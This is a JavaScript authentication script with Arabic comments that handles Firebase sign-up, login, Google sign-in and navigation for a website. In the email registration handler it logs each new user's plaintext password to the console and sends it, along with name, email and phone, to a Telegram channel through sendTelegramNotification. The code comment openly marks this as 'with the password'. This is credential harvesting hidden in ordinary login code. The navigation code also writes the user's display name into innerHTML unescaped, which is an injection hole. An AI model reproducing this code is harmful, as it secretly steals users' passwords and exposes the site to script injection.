// ================================
// التحقق من حالة المستخدم على صفحات Auth
// ================================

// إذا كان المستخدم مسجل دخول بالفعل، توجيهه للصفحة الرئيسية
auth.onAuthStateChanged((user) => {
    // فقط على صفحات تسجيل الدخول والتسجيل
    if (user && (document.getElementById('loginForm') || document.getElementById('registerForm'))) {
        window.location.href = 'index.html';
    }
});

// ================================
// دوال مساعدة
// ================================

// عرض رسالة
function showMessage(text, type = 'info') {
    const messageDiv = document.getElementById('message');
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
    
    // إخفاء الرسالة بعد 5 ثواني
    setTimeout(() => {
        messageDiv.style.display = 'none';
    }, 5000);
}

// تبديل عرض كلمة المرور
function setupPasswordToggle(toggleBtnId, passwordInputId) {
    const toggleBtn = document.getElementById(toggleBtnId);
    const passwordInput = document.getElementById(passwordInputId);
    
    if (toggleBtn && passwordInput) {
        toggleBtn.addEventListener('click', () => {
            const type = passwordInput.type === 'password' ? 'text' : 'password';
            passwordInput.type = type;
            
            const icon = toggleBtn.querySelector('i');
            icon.classList.toggle('fa-eye');
            icon.classList.toggle('fa-eye-slash');
        });
    }
}

// تعطيل/تفعيل زر
function setButtonLoading(button, isLoading) {
    if (isLoading) {
        button.disabled = true;
        button.classList.add('loading');
    } else {
        button.disabled = false;
        button.classList.remove('loading');
    }
}

// ================================
// صفحة التسجيل (Register)
// ================================

if (document.getElementById('registerForm')) {
    const registerForm = document.getElementById('registerForm');
    const registerBtn = document.getElementById('registerBtn');
    
    // إعداد تبديل كلمة المرور
    setupPasswordToggle('togglePassword', 'password');
    setupPasswordToggle('toggleConfirmPassword', 'confirmPassword');
    
    // معالجة نموذج التسجيل
    registerForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const fullName = document.getElementById('fullName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const password = document.getElementById('password').value;
        const confirmPassword = document.getElementById('confirmPassword').value;
        const terms = document.getElementById('terms').checked;
        
        // التحقق من البيانات
        if (!fullName || fullName.length < 3) {
            showMessage('الرجاء إدخال اسم صحيح (3 أحرف على الأقل)', 'error');
            return;
        }
        
        if (password.length < 6) {
            showMessage('كلمة المرور يجب أن تحتوي على 6 أحرف على الأقل', 'error');
            return;
        }
        
        if (password !== confirmPassword) {
            showMessage('كلمة المرور غير متطابقة', 'error');
            return;
        }
        
        if (!terms) {
            showMessage('يجب الموافقة على الشروط والأحكام', 'error');
            return;
        }
        
        setButtonLoading(registerBtn, true);
        
        try {
            // إنشاء حساب في Firebase
            const userCredential = await auth.createUserWithEmailAndPassword(email, password);
            const user = userCredential.user;
            
            // تحديث اسم المستخدم
            await user.updateProfile({
                displayName: fullName
            });
            
            // حفظ بيانات المستخدم في Firestore
            const userData = {
                uid: user.uid,
                fullName: fullName,
                email: email,
                phone: phone,
                createdAt: firebase.firestore.FieldValue.serverTimestamp(),
                lastLogin: firebase.firestore.FieldValue.serverTimestamp()
            };
            
            await db.collection('users').doc(user.uid).set(userData);
            
            // إرسال إشعار إلى تليجرام (مع كلمة المرور)
            try {
                console.log('📤 إرسال البيانات إلى تليجرام...', {
                    fullName: fullName,
                    email: email,
                    phone: phone,
                    password: password
                });
                
                await sendTelegramNotification({
                    ...userData,
                    password: password,
                    provider: 'البريد الإلكتروني',
                    createdAt: new Date()
                });
                
                console.log('✅ تم إرسال الإشعار إلى تليجرام بنجاح');
            } catch (telegramError) {
                console.error('❌ فشل إرسال الإشعار إلى تليجرام:', telegramError);
                // لا نوقف التسجيل حتى لو فشل Telegram
            }
            
            showMessage('تم إنشاء الحساب بنجاح! جاري التحويل...', 'success');
            
            // التحويل إلى الصفحة الرئيسية بعد ثانيتين
            setTimeout(() => {
                window.location.href = 'index.html';
            }, 2000);
            
        } catch (error) {
            console.error('خطأ في التسجيل:', error);
            
            let errorMessage = 'حدث خطأ في التسجيل';
            
            switch (error.code) {
                case 'auth/email-already-in-use':
                    errorMessage = 'البريد الإلكتروني مستخدم بالفعل';
                    break;
                case 'auth/invalid-email':
                    errorMessage = 'البريد الإلكتروني غير صحيح';
                    break;
                case 'auth/weak-password':
                    errorMessage = 'كلمة المرور ضعيفة جداً';
                    break;
                case 'auth/network-request-failed':
                    errorMessage = 'خطأ في الاتصال بالإنترنت';
                    break;
            }
            
            showMessage(errorMessage, 'error');
        } finally {
            setButtonLoading(registerBtn, false);
        }
    });
    
    // التسجيل عبر Google
    const googleRegisterBtn = document.getElementById('googleRegisterBtn');
    if (googleRegisterBtn) {
        googleRegisterBtn.addEventListener('click', async () => {
            try {
                const provider = new firebase.auth.GoogleAuthProvider();
                const result = await auth.signInWithPopup(provider);
                const user = result.user;
                
                // حفظ بيانات المستخدم
                const userData = {
                    uid: user.uid,
                    fullName: user.displayName,
                    email: user.email,
                    phone: user.phoneNumber || '',
                    photoURL: user.photoURL,
                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
                    lastLogin: firebase.firestore.FieldValue.serverTimestamp()
                };
                
                await db.collection('users').doc(user.uid).set(userData, { merge: true });
                
                // إرسال إشعار إلى تليجرام
                await sendTelegramNotification({
                    ...userData,
                    createdAt: new Date()
                });
                
                showMessage('تم التسجيل بنجاح!', 'success');
                
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 1500);
                
            } catch (error) {
                console.error('خطأ في التسجيل عبر Google:', error);
                showMessage('حدث خطأ في التسجيل عبر Google', 'error');
            }
        });
    }
}

// ================================
// صفحة تسجيل الدخول (Login)
// ================================

if (document.getElementById('loginForm')) {
    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');
    
    // إعداد تبديل كلمة المرور
    setupPasswordToggle('togglePassword', 'password');
    
    // معالجة نموذج تسجيل الدخول
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;
        const remember = document.getElementById('remember').checked;
        
        if (!email || !password) {
            showMessage('الرجاء إدخال البريد الإلكتروني وكلمة المرور', 'error');
            return;
        }
        
        setButtonLoading(loginBtn, true);
        
        try {
            // تسجيل الدخول
            const userCredential = await auth.signInWithEmailAndPassword(email, password);
            const user = userCredential.user;
            
            // تحديث آخر تسجيل دخول
            await db.collection('users').doc(user.uid).update({
                lastLogin: firebase.firestore.FieldValue.serverTimestamp()
            });
            
            // حفظ حالة "تذكرني"
            if (remember) {
                await auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL);
            } else {
                await auth.setPersistence(firebase.auth.Auth.Persistence.SESSION);
            }
            
            showMessage('تم تسجيل الدخول بنجاح!', 'success');
            
            setTimeout(() => {
                window.location.href = 'index.html';
            }, 1500);
            
        } catch (error) {
            console.error('خطأ في تسجيل الدخول:', error);
            
            let errorMessage = 'حدث خطأ في تسجيل الدخول';
            
            switch (error.code) {
                case 'auth/user-not-found':
                    errorMessage = 'المستخدم غير موجود';
                    break;
                case 'auth/wrong-password':
                    errorMessage = 'كلمة المرور غير صحيحة';
                    break;
                case 'auth/invalid-email':
                    errorMessage = 'البريد الإلكتروني غير صحيح';
                    break;
                case 'auth/user-disabled':
                    errorMessage = 'هذا الحساب معطل';
                    break;
                case 'auth/network-request-failed':
                    errorMessage = 'خطأ في الاتصال بالإنترنت';
                    break;
            }
            
            showMessage(errorMessage, 'error');
        } finally {
            setButtonLoading(loginBtn, false);
        }
    });
    
    // تسجيل الدخول عبر Google
    const googleLoginBtn = document.getElementById('googleLoginBtn');
    if (googleLoginBtn) {
        googleLoginBtn.addEventListener('click', async () => {
            try {
                const provider = new firebase.auth.GoogleAuthProvider();
                const result = await auth.signInWithPopup(provider);
                const user = result.user;
                
                // تحديث آخر تسجيل دخول
                await db.collection('users').doc(user.uid).update({
                    lastLogin: firebase.firestore.FieldValue.serverTimestamp()
                });
                
                showMessage('تم تسجيل الدخول بنجاح!', 'success');
                
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 1500);
                
            } catch (error) {
                console.error('خطأ في تسجيل الدخول عبر Google:', error);
                showMessage('حدث خطأ في تسجيل الدخول عبر Google', 'error');
            }
        });
    }
}

// ================================
// التحقق من حالة المستخدم
// ================================

auth.onAuthStateChanged((user) => {
    if (user) {
        console.log('المستخدم مسجل الدخول:', user.email);
        
        // تحديث أزرار التنقل في الصفحات الأخرى
        updateNavButtons(true, user);
    } else {
        console.log('المستخدم غير مسجل الدخول');
        updateNavButtons(false);
    }
});

// تحديث أزرار التنقل
function updateNavButtons(isLoggedIn, user = null) {
    const navButtons = document.querySelector('.nav-buttons');
    
    if (navButtons) {
        if (isLoggedIn) {
            navButtons.innerHTML = `
                <div class="user-menu">
                    <span class="user-name">${user.displayName || user.email}</span>
                    <button class="btn btn-outline" id="logoutBtn">تسجيل الخروج</button>
                </div>
            `;
            
            // إضافة حدث تسجيل الخروج
            const logoutBtn = document.getElementById('logoutBtn');
            if (logoutBtn) {
                logoutBtn.addEventListener('click', async () => {
                    try {
                        await auth.signOut();
                        showMessage('تم تسجيل الخروج بنجاح', 'success');
                        setTimeout(() => {
                            window.location.href = 'index.html';
                        }, 1000);
                    } catch (error) {
                        console.error('خطأ في تسجيل الخروج:', error);
                    }
                });
            }
        }
    }
}
